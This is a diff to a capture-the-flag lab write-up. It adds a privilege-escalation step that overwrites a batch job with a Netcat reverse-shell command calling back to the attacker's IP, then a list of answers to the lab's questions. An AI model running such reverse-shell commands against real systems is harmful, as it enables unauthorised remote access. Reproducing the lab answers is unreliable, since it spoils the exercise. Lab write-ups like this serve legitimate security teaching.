@@ -289,10 +289,68 @@ nc -lvnp {port of your choice}
 
 Now we can go back to our `SSH` tab.
 
-Remember to leave powershell. Just type `exit`.
+Remember to `leave powershell`. Just type `exit`.
 
 Now, we can type:
 
 ```
-
+echo "C:\Log-Management\nc64.exe -e cmd.exe {your tun0 ip} {port you have chosen}" > C:\Log-Management\job.bat
 ```
+
+![Netcat](./Screenshots/markupnetcat2.png)
+
+Let's look back at our `Netcat` tab. Our `reverse shell` works.
+
+![Netcat](./Screenshots/markupnetcat3.png)
+
+### Get the root flag
+
+The `root` flag is in the `C:\Users\Administrator\Desktop` path.
+
+![flag](./Screenshots/markuprootflag.png)
+
+### Paste the flags
+
+![pwned](./Screenshots/markuppwned.png)
+
+## Answers
+
+### Task-1: What version of Apache is running on the target's port 80?
+
+2.4.41
+
+### Task-2: What username:password combination logs in successfully?
+
+admin:password
+
+### Task-3: What is the word at the top of the page that accepts user input?
+
+order
+
+### Task-4: What XML version is used on the target?
+
+1.0
+
+### Task-5: What does the XXE / XEE attack acronym stand for?
+
+XML External Entity
+
+### Task-6:What username can we find on the webpage's HTML code?
+
+Daniel
+
+### Task-7: What is the file located in the Log-Management folder on the target?
+
+job.bat
+
+### Task-8: What executable is mentioned in the file mentioned before?
+
+wevtutil.exe
+
+### Submit user flag
+
+good one
+
+### Submit root flag
+
+Thank You
